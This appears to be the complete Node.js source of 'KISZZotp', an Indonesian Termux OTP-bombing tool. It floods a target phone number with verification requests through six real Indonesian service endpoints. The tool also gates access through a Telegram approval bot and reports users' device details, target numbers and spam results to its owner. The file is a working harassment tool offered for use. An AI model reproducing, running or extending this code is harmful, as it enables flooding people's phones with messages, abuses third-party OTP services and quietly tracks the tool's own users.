import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';

const CONFIG = {
    TELEGRAM_TOKEN: 'GANTI_DENGAN_TOKEN_BOTMU',
    TELEGRAM_CHAT_ID: 'GANTI_DENGAN_CHAT_ID_MU',
    OWNER_NUMBER: '085168142675',
    VERSION: '1.3.0',
    APPROVAL_TIMEOUT: 120,
    POLL_INTERVAL: 3,
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================
// 1. UTILITY
// ============================================
function getTermuxId() {
    try {
        const uid = execSync('id -u').toString().trim();
        const hostname = os.hostname();
        return `${uid}@${hostname}`;
    } catch { return 'unknown'; }
}

function getDeviceInfo() {
    try {
        const model = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const android = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return `${model} (Android ${android})`;
    } catch { return 'Unknown Device'; }
}

function getCurrentTime() {
    return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
}

function generateCode() {
    return crypto.randomInt(100000, 999999).toString();
}

// ============================================
// 2. TELEGRAM – NOTIFIKASI & APPROVAL
// ============================================
async function notifyOwner(message) {
    if (!CONFIG.TELEGRAM_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return;
    try {
        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch {}
}

async function sendTelegramMessage(text, keyboard = null) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`;
        const payload = {
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
        };
        if (keyboard) {
            payload.reply_markup = JSON.stringify({
                inline_keyboard: keyboard
            });
        }
        await axios.post(url, payload);
        return true;
    } catch { return false; }
}

async function answerCallbackQuery(callbackId, text) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/answerCallbackQuery`;
        await axios.post(url, {
            callback_query_id: callbackId,
            text: text,
            show_alert: false
        });
    } catch {}
}

// ============================================
// 3. APPROVAL SYSTEM
// ============================================
function isApproved(termuxId) {
    try {
        if (!fs.existsSync('approved.json')) return false;
        const data = JSON.parse(fs.readFileSync('approved.json'));
        return data.includes(termuxId);
    } catch { return false; }
}

function saveApproved(termuxId) {
    try {
        let data = [];
        if (fs.existsSync('approved.json')) {
            data = JSON.parse(fs.readFileSync('approved.json'));
        }
        if (!data.includes(termuxId)) {
            data.push(termuxId);
            fs.writeFileSync('approved.json', JSON.stringify(data, null, 2));
        }
        return true;
    } catch { return false; }
}

async function requestApproval(userName, termuxId, device) {
    const code = generateCode();
    const keyboard = [
        [
            { text: '✅ Approve', callback_data: `approve_${code}` },
            { text: '❌ Deny', callback_data: `deny_${code}` }
        ]
    ];

    const msg = `🔐 *Request Approval KISZZotp*

👤 Nama: ${userName}
🆔 ID: ${termuxId}
📱 Device: ${device}
🔑 Kode: *${code}*

Tap tombol di bawah:`;

    console.log(chalk.yellow('\n⏳ Mengirim request approval ke owner...'));
    const sent = await sendTelegramMessage(msg, keyboard);
    if (!sent) {
        console.log(chalk.red('❌ Gagal kirim ke Telegram. Cek token & chat ID.'));
        process.exit(1);
    }

    console.log(chalk.green('✅ Request terkirim! Tunggu owner tap tombol...'));

    let offset = 0;
    const startTime = Date.now();
    while ((Date.now() - startTime) / 1000 < CONFIG.APPROVAL_TIMEOUT) {
        const updates = await getTelegramUpdates(offset);
        for (const update of updates) {
            offset = update.update_id + 1;
            if (update.callback_query) {
                const data = update.callback_query.data;
                const fromId = update.callback_query.from.id;
                const callbackId = update.callback_query.id;
                if (fromId == CONFIG.TELEGRAM_CHAT_ID) {
                    if (data === `approve_${code}`) {
                        await answerCallbackQuery(callbackId, '✅ Disetujui!');
                        console.log(chalk.green('\n✅ APPROVED oleh owner!'));
                        saveApproved(termuxId);
                        await notifyOwner(`✅ *${userName}* (${termuxId}) telah di-APPROVE.`);
                        return true;
                    } else if (data === `deny_${code}`) {
                        await answerCallbackQuery(callbackId, '❌ Ditolak.');
                        console.log(chalk.red('\n❌ Ditolak oleh owner.'));
                        await notifyOwner(`❌ *${userName}* (${termuxId}) di-DENY.`);
                        return false;
                    }
                } else {
                    await answerCallbackQuery(callbackId, '❌ Anda bukan owner!');
                }
            }
        }
        await sleep(CONFIG.POLL_INTERVAL * 1000);
    }

    console.log(chalk.red('\n⏰ Waktu habis! Tidak ada respon dari owner.'));
    return false;
}

async function getTelegramUpdates(offset) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/getUpdates`;
        const res = await axios.get(url, { params: { offset, timeout: 10 } });
        return res.data.result || [];
    } catch { return []; }
}

// ============================================
// 4. FUNGSI LAINNYA
// ============================================
function getUserName() {
    let name = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    if (!name.trim()) name = 'Anonymous';
    return name.trim();
}

function getStatus(isOwner) {
    return isOwner ? chalk.green('★ OWNER') : chalk.yellow('▸ Gratisan');
}

function showHeader(user, status, termuxId, device) {
    console.clear();
    console.log(chalk.cyan(`
╔═══════════════════════════════════════════════╗
║   ██╗  ██╗██╗███████╗███████╗███████╗       ║
║   ██║ ██╔╝██║╚══███╔╝╚══███╔╝╚══███╔╝       ║
║   █████╔╝ ██║  ███╔╝   ███╔╝   ███╔╝        ║
║   ██╔═██╗ ██║ ███╔╝   ███╔╝   ███╔╝         ║
║   ██║  ██╗██║███████╗███████╗███████╗       ║
║   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝       ║
║         ${chalk.bold('KISZZotp v' + CONFIG.VERSION)}                     ║
╚═══════════════════════════════════════════════╝
`));
    console.log(chalk.white(`╔═══════════════════════════════════════════════╗`));
    console.log(chalk.white(`║ ${chalk.bold('👤 User')}   : ${chalk.green(user)}`));
    console.log(chalk.white(`║ ${chalk.bold('📊 Status')} : ${status}`));
    console.log(chalk.white(`║ ${chalk.bold('🆔 ID')}     : ${chalk.blue(termuxId)}`));
    console.log(chalk.white(`║ ${chalk.bold('📱 Device')} : ${chalk.magenta(device)}`));
    console.log(chalk.white(`║ ${chalk.bold('⏰ Waktu')}  : ${chalk.gray(getCurrentTime())}`));
    console.log(chalk.white(`╚═══════════════════════════════════════════════╝`));
    console.log();
}

function showMenu() {
    console.log(chalk.yellow(`╔═══════════════════════════════════════════════╗`));
    console.log(chalk.yellow(`║              📋  MENU UTAMA                  ║`));
    console.log(chalk.yellow(`╠═══════════════════════════════════════════════╣`));
    console.log(chalk.yellow(`║ ${chalk.cyan('1.')} 🚀  Halaman Spammer OTP         ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('2.')} 🐛  Halaman Lapor Bug           ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('3.')} 🔄  Halaman Cek Update         ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('4.')} ❌  Keluar                     ║`));
    console.log(chalk.yellow(`╚═══════════════════════════════════════════════╝`));
    console.log();
}

// ============================================
// 5. HALAMAN SPAMMER (dengan notifikasi)
// ============================================
async function halamanSpammer(user, termuxId, device) {
    console.clear();
    console.log(chalk.cyan(`
╔═══════════════════════════════════════════════╗
║         🚀  HALAMAN SPAMMER OTP              ║
╚═══════════════════════════════════════════════╝
`));

    const target = readlineSync.question(chalk.white('📱 Masukkan nomor target (contoh: 08123456789): '));
    if (!target.trim()) {
        console.log(chalk.red('❌ Nomor tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
        return;
    }

    let phone = target.replace(/[^0-9]/g, "");
    if (phone.startsWith("0")) phone = "62" + phone.slice(1);
    if (!phone.startsWith("62")) phone = "62" + phone;

    const p08 = "0" + phone.slice(2);
    const p62 = phone;

    console.log(chalk.green(`✅ Target: ${phone}\n`));
    console.log(chalk.gray('⏳ Mengirim OTP... (proses ini bisa makan waktu)\n'));

    // Kirim notifikasi ke owner bahwa user mulai spam
    await notifyOwner(`🚀 *${user}* (${termuxId}) memulai spam ke nomor: \`${phone}\``);

    const otp = [
        { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "REDACTED" } },
        { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
        { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
        { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
        { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "REDACTED", "country-code": "ID" } },
        { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
    ];

    let success = 0, failed = 0;
    for (let i = 0; i < otp.length; i++) {
        const ep = otp[i];
        try {
            const config = {
                headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
                timeout: 10000
            };
            process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
            if (ep.method === "GET") await axios.get(ep.url, config);
            else await axios.post(ep.url, ep.data, config);
            success++;
            console.log(chalk.green('✅ Berhasil'));
        } catch {
            failed++;
            console.log(chalk.red('❌ Gagal'));
        }
        await sleep(1000);
    }

    const laporan = `📱 Nomor: ${phone}\n📤 Total: ${otp.length}\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`;
    console.log('\n========== LAPORAN ==========');
    console.log(laporan);
    console.log('===============================\n');

    // Kirim notifikasi hasil spam ke owner
    await notifyOwner(`📊 *Hasil Spam dari ${user}* (${termuxId})\n${laporan}`);

    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
}

// ============================================
// 6. HALAMAN LAPOR BUG (dengan notifikasi)
// ============================================
function halamanLaporBug(user, termuxId, device) {
    console.clear();
    console.log(chalk.yellow(`
╔═══════════════════════════════════════════════╗
║         🐛  HALAMAN LAPOR BUG               ║
╚═══════════════════════════════════════════════╝
`));
    console.log(chalk.white(`📱 Nomor Owner: ${CONFIG.OWNER_NUMBER}`));
    console.log(chalk.gray('Kirim pesan ke WhatsApp dengan format:\n- Nama: [Nama Anda]\n- Bug: [Deskripsi bug]\n- Screenshot: [Opsional]\n'));

    const confirm = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
    if (confirm.toLowerCase() === 'y') {
        const url = `https://wa.me/${CONFIG.OWNER_NUMBER}?text=Halo%20KISZZ%2C%20saya%20${encodeURIComponent(user)}%20ingin%20lapor%20bug.%0A%0ADeskripsi%3A%20`;
        execSync(`termux-open-url "${url}"`);
        // Notifikasi owner
        notifyOwner(`🐛 *${user}* (${termuxId}) membuka lapor bug ke WhatsApp.`);
    }
    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
}

// ============================================
// 7. HALAMAN CEK UPDATE
// ============================================
async function halamanCekUpdate(user, termuxId) {
    console.clear();
    console.log(chalk.cyan(`
╔═══════════════════════════════════════════════╗
║         🔄  HALAMAN CEK UPDATE              ║
╚═══════════════════════════════════════════════╝
`));
    console.log(chalk.green(`✅ Versi terbaru: ${CONFIG.VERSION}`));
    console.log(chalk.gray('Anda sudah menggunakan versi terbaru.'));
    // Notifikasi owner (opsional, bisa dikomentari kalau terlalu spam)
    // await notifyOwner(`🔄 *${user}* (${termuxId}) cek update.`);
    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
}

// ============================================
// 8. MAIN PROGRAM
// ============================================
async function main() {
    console.clear();
    console.log(chalk.cyan(`
╔═══════════════════════════════════════════════╗
║     SELAMAT DATANG DI KISZZotp               ║
╚═══════════════════════════════════════════════╝
`));

    const userName = getUserName();
    const termuxId = getTermuxId();
    const device = getDeviceInfo();
    const isOwner = userName.toLowerCase() === 'kiszz';

    if (!isOwner) {
        if (!isApproved(termuxId)) {
            console.log(chalk.yellow('\n🔐 Script ini memerlukan approval dari owner.'));
            const approved = await requestApproval(userName, termuxId, device);
            if (!approved) {
                console.log(chalk.red('❌ Akses ditolak. Script akan keluar.'));
                process.exit(1);
            }
        } else {
            console.log(chalk.green('\n✅ Anda sudah terdaftar. Selamat datang kembali!'));
            await notifyOwner(`👤 *${userName}* (${termuxId}) login kembali.`);
            await sleep(1500);
        }
    } else {
        console.log(chalk.green('\n👑 Owner mode aktif. Tidak perlu approval.'));
        await sleep(1500);
    }

    while (true) {
        const status = getStatus(isOwner);
        showHeader(userName, status, termuxId, device);
        showMenu();

        const choice = readlineSync.question(chalk.cyan('Pilih menu [1-4]: '));

        switch (choice) {
            case '1':
                await halamanSpammer(userName, termuxId, device);
                break;
            case '2':
                halamanLaporBug(userName, termuxId, device);
                break;
            case '3':
                await halamanCekUpdate(userName, termuxId);
                break;
            case '4':
                console.log(chalk.green('\n👋 Terima kasih telah menggunakan KISZZotp!'));
                await notifyOwner(`👋 *${userName}* (${termuxId}) keluar dari script.`);
                process.exit(0);
            default:
                console.log(chalk.red('❌ Pilihan tidak valid!'));
                await sleep(1000);
        }
    }
}

main().catch(err => console.error(chalk.red('❌ Error:', err.message)));
